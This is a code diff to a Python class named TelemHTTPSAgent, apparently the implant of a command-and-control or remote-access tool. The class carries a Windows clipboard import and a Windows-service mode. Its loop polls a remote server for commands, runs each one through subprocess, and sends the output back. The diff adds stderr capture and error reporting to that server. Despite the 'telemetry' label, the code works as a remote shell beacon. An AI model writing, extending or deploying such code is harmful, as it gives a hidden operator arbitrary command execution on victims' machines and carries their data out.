@@ -9,7 +9,7 @@ from datetime import datetime
 import pytz
 import random
 import time 
-
+import subprocess 
 import platform
 if platform.system() == 'Windows':
 	import win32clipboard
@@ -63,7 +63,12 @@ class TelemHTTPSAgent(HTTPSAgent):
 			try:
 				command = self.pollCommand()
 				if command != None:
-					cmd_output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE).stdout.read().decode("utf-8") 
+					use_shell = True
+					if(self.i_am_a_win_service):
+						use_shell = False   
+					cmd_obj = subprocess.Popen(command, shell=use_shell, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+					cmd_output = cmd_obj.stdout.read().decode("utf-8") 
+					cmd_output += cmd_obj.stderr.read().decode("utf-8") 
 					if self.newLineAfterCmdOutput:
 						cmd_output = cmd_output + "\n"
 					self.postResponse(cmd_output)
@@ -73,6 +78,7 @@ class TelemHTTPSAgent(HTTPSAgent):
 				self.pollTelemetry()
 			except Exception as e:
 				live = False
+				self.postResponse("Shutting down {}".format(e))
 				print("Shutting down {}".format(e), file=sys.stderr)
 		for key in self.sessionsDict:
 			self.sessionsDict[key].kill()
